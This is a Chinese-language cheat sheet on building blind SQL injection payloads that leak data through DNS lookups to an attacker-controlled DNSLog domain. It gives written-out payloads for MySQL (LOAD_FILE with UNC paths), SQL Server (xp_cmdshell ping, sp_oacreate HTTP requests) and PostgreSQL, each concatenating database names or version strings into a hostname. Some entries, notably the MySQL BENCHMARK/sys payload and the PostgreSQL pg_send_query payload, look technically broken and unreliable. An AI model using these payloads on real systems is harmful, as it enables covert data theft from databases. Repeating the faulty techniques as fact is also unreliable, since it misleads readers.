### SQL 注入无回显利用 DNSLog 如何构造

**1. MySQL/MariaDB**

在 MySQL 和 MariaDB 中，`LOAD_FILE()` 函数和 `UNC` 路径（Windows 共享路径）是触发 DNS 查询的常用手段

**a. 利用 `LOAD_FILE()`**

`LOAD_FILE()` 函数用于读取文件内容，但如果给它一个 UNC 路径，它会触发 DNS 查询

- **Payload 构造：** `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT DATABASE()),'.your-dnslog.com\\a'));`
- **解释：**
  - `SELECT DATABASE()`：获取当前数据库名
  - `CONCAT(...)`：将数据库名与你的 DNSlog 域名拼接成一个新的域名，例如 `testdb.your-dnslog.com`
  - `LOAD_FILE()`：尝试加载这个 UNC 路径，由于域名不存在本地，它会发起 DNS 查询
  - `\\a`：这是一个占位符，用于避免语法错误

**b. 利用 `DNS_REVERSE()` 和 `BENCHMARK()`**

这是一个更高级的技巧，需要 MySQL 5.7.10 或更高版本，且安装了 `sys` 模式

- **Payload 构造：** `SELECT BENCHMARK(1000000,MD5(CONCAT('a',(SELECT DATABASE())))) AND (SELECT sys.version_get_option('version') LIKE '%DNS%');`
  - 注意：这个方法主要是为了演示 `sys` 库的功能，实际操作中 `LOAD_FILE` 更常见

**2. SQL Server**

在 SQL Server 中，我们可以利用 `xp_cmdshell` 或 `sp_oacreate` 来触发 DNS 查询

**a. 利用 `xp_cmdshell`**

`xp_cmdshell` 是一个强大的存储过程，可以执行系统命令。我们可以利用 `ping` 命令来触发 DNS 查询

- **Payload 构造：** `EXEC xp_cmdshell 'ping -n 1 ' + (SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases) + '.your-dnslog.com';`
- **解释：**
  - `xp_cmdshell`：执行 `ping` 命令
  - `SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases`：获取第一个数据库的名称
  - `+`：将数据库名与你的 DNSlog 域名拼接

**b. 利用 `sp_oacreate`**

`sp_oacreate` 可以创建 OLE 对象，我们可以利用它来发起 HTTP 请求，从而触发 DNS 查询

- **Payload 构造：** `DECLARE @h INT; EXEC sp_oacreate 'WinHttp.WinHttpRequest.5.1', @h OUT; EXEC sp_oamethod @h, 'Open', NULL, 'GET', 'http://' + (SELECT TOP 1 CAST(name AS VARCHAR(255)) FROM sys.databases) + '.your-dnslog.com';`



#### 3. PostgreSQL



------

在 PostgreSQL 中，`COPY` 命令和 `pg_sleep` 结合可以实现 DNSlog。但更直接的方法是利用 `pg_send_query` 或 `UDF`（用户定义函数）。

- **Payload 构造：** `SELECT * FROM users WHERE id = 1 AND (SELECT pg_send_query('SELECT * FROM ' || (SELECT version()) || '.your-dnslog.com')) IS NOT NULL;`
- **解释：**
  - `pg_send_query()`：用于发送一个查询。
  - `(SELECT version())`：获取 PostgreSQL 的版本信息。
  - 这个方法利用了 PostgreSQL 在解析域名时会触发 DNS 查询的特性